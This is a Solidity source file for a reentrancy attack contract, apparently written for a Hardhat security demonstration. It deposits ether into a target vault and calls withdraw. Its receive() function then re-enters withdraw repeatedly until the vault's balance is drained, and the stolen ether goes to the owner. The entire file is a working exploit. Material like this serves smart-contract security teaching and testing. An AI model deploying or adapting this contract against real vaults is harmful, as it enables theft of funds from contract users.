// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10 <0.9.0;

import "hardhat/console.sol";

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentranceAttackContract {
    IVault public immutable vulnerableVault;
    address public owner;

    constructor(address etherBankAddress) {
        vulnerableVault = IVault(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        console.log("attack initializaed");
        vulnerableVault.deposit{value: msg.value}();
        vulnerableVault.withdraw();
        console.log("attack done");
    }

    receive() external payable {
      if(msg.sender == address(vulnerableVault) ){
        if (address(vulnerableVault).balance > 0) {
            console.log("reentering...");
            vulnerableVault.withdraw();
        } else {
            console.log('victim account drained. transfer to owner account');
            payable(owner).transfer(address(this).balance);
        }
      }else{
        console.log("Thanks for your mistake");
      }
    }

    // check the total balance of the Attacker contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can attack.");
        _;
    } 

}